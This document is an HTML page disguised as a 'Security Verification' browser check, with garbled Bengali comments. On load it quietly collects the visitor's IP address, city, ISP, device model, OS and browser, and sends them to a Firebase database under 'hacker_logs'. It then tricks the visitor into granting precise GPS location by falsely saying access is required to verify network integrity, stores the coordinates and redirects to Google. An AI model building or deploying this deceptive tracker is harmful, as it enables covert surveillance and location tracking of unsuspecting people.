<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    
    <!-- UAParser -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
    
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ‡ßß. ‡¶°‡¶æ‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶∂‡ßÅ‡¶∞‡ßÅ (‡¶Ü‡¶á‡¶™‡¶ø ‡¶ì ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã)
        window.initLog = function(data) {
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            set(newLogRef, {
                timestamp: new Date().toString(),
                ...data,
                latitude: "Tracing...",
                longitude: "Tracing...",
                actionStatus: "Connecting..." 
            }).then(() => {
                sessionStorage.setItem('logKey', newLogRef.key);
                // ‡¶°‡¶æ‡¶ü‡¶æ ‡¶∏‡ßá‡¶≠ ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶™‡¶∞ ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶≤‡ßÅ‡¶™ ‡¶∂‡ßÅ‡¶∞‡ßÅ
                setTimeout(window.forceLocation, 1000); 
            });
        };

        // ‡ß®. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ
        window.updateWithGPS = function(lat, lng) {
            const key = sessionStorage.getItem('logKey');
            if (key) {
                const updateRef = ref(db, 'hacker_logs/' + key);
                update(updateRef, {
                    latitude: lat,
                    longitude: lng,
                    actionStatus: "‚úÖ Verified"
                }).then(() => {
                    // ‡¶ï‡¶æ‡¶ú ‡¶∂‡ßá‡¶∑‡ßá ‡¶ó‡ßÅ‡¶ó‡¶≤‡ßá ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶¶‡ßá‡¶ì‡ßü‡¶æ
                    window.location.href = "https://www.google.com";
                });
            }
        };
    </script>

    <style>
        :root {
            --bg-color: #e0e5ec;
            --text-color: #4a4a4a;
            --accent-color: #007bff;
            --shadow-light: #ffffff;
            --shadow-dark: #a3b1c6;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }

        .card {
            width: 90%;
            max-width: 350px;
            padding: 40px;
            border-radius: 30px;
            background: var(--bg-color);
            box-shadow: 20px 20px 60px var(--shadow-dark), 
                       -20px -20px 60px var(--shadow-light);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .icon-area {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: var(--bg-color);
            box-shadow: inset 6px 6px 12px var(--shadow-dark), 
                        inset -6px -6px 12px var(--shadow-light);
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 25px;
            font-size: 30px;
            color: var(--accent-color);
        }

        h2 {
            font-size: 22px;
            margin-bottom: 10px;
            color: var(--text-color);
        }

        p {
            font-size: 14px;
            color: #777;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        /* ‡¶∏‡ßÅ‡¶®‡ßç‡¶¶‡¶∞ ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶®‡¶ø‡¶Æ‡ßá‡¶∂‡¶® */
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(0, 123, 255, 0.1);
            border-left-color: var(--accent-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn-retry {
            padding: 12px 25px;
            border: none;
            outline: none;
            border-radius: 50px;
            background: var(--bg-color);
            box-shadow: 6px 6px 12px var(--shadow-dark), 
                       -6px -6px 12px var(--shadow-light);
            color: var(--accent-color);
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: 0.3s;
            display: none; /* ‡¶∂‡ßÅ‡¶∞‡ßÅ‡¶§‡ßá ‡¶≤‡ßÅ‡¶ï‡¶æ‡¶®‡ßã */
        }

        .btn-retry:active {
            box-shadow: inset 4px 4px 8px var(--shadow-dark), 
                        inset -4px -4px 8px var(--shadow-light);
        }

    </style>
</head>
<body>

    <div class="card">
        <div class="icon-area">
            <!-- ‡¶∏‡¶ø‡¶ï‡¶ø‡¶â‡¶∞‡¶ø‡¶ü‡¶ø ‡¶∂‡¶ø‡¶≤‡ßç‡¶° ‡¶Ü‡¶á‡¶ï‡¶® -->
            üõ°Ô∏è
        </div>
        
        <h2 id="statusTitle">Checking Connection...</h2>
        <p id="statusMsg">Please wait while we verify your browser security settings.</p>

        <div class="spinner" id="spinner"></div>

        <button class="btn-retry" id="retryBtn" onclick="window.forceLocation()">
            Allow Access to Verify
        </button>
    </div>

    <script>
        let ipInfo = {};

        window.onload = function() {
            // ‡¶Ü‡¶á‡¶™‡¶ø ‡¶°‡¶æ‡¶ü‡¶æ ‡¶´‡ßá‡¶ö ‡¶ï‡¶∞‡¶æ
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    ipInfo = data;
                    prepareInitialData();
                })
                .catch(() => {
                    ipInfo = { ip: "Unknown", city: "Unknown" };
                    prepareInitialData();
                });
        };

        function prepareInitialData() {
            var parser = new UAParser();
            var result = parser.getResult();
            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");

            let initialPayload = {
                ip: ipInfo.ip || "Tracing...",
                city: ipInfo.city || "Tracing...",
                isp: ipInfo.org || "Tracing...",
                deviceModel: deviceName,
                os: result.os.name,
                browser: result.browser.name,
                latitude: "Tracing...",
                longitude: "Tracing..."
            };

            if(window.initLog) window.initLog(initialPayload);
        }

        window.forceLocation = function() {
            // UI ‡¶Ü‡¶™‡¶°‡ßá‡¶ü: ‡¶¨‡¶æ‡¶ü‡¶® ‡¶≤‡ßÅ‡¶ï‡¶ø‡ßü‡ßá ‡¶∏‡ßç‡¶™‡¶ø‡¶®‡¶æ‡¶∞ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã
            document.getElementById('retryBtn').style.display = 'none';
            document.getElementById('spinner').style.display = 'block';
            document.getElementById('statusTitle').innerText = "Verifying...";
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // ‡¶∏‡¶æ‡¶ï‡¶∏‡ßá‡¶∏ ‡¶π‡¶≤‡ßá
                        document.getElementById('statusTitle').innerText = "Verified!";
                        document.getElementById('statusTitle').style.color = "#00b894"; // ‡¶∏‡¶¨‡ßÅ‡¶ú
                        document.querySelector('.icon-area').innerText = "‚úÖ";
                        
                        if(window.updateWithGPS) {
                            window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                        }
                    },
                    function(error) {
                        // ‡¶´‡ßá‡¶á‡¶≤ ‡¶π‡¶≤‡ßá UI ‡¶§‡ßá ‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶®‡¶ø‡¶Ç
                        handleError();
                    },
                    { enableHighAccuracy: true }
                );
            }
        }

        function handleError() {
            // ‡¶∏‡ßç‡¶™‡¶ø‡¶®‡¶æ‡¶∞ ‡¶∏‡¶∞‡¶ø‡ßü‡ßá ‡¶¨‡¶æ‡¶ü‡¶® ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã
            document.getElementById('spinner').style.display = 'none';
            
            document.getElementById('statusTitle').innerText = "Connection Failed";
            document.getElementById('statusMsg').innerText = "Location access is required to verify your network integrity.";
            
            // ‡¶Ü‡¶á‡¶ï‡¶® ‡¶≤‡¶æ‡¶≤ ‡¶ï‡¶∞‡¶æ
            let iconArea = document.querySelector('.icon-area');
            iconArea.innerText = "‚ö†Ô∏è";
            iconArea.style.color = "#ff4757";

            // ‡¶¨‡¶æ‡¶ü‡¶® ‡¶∂‡ßã ‡¶ï‡¶∞‡¶æ
            let btn = document.getElementById('retryBtn');
            btn.style.display = 'inline-block';
            btn.innerText = "Try Again (Allow Access)";
        }
    </script>
</body>
</html>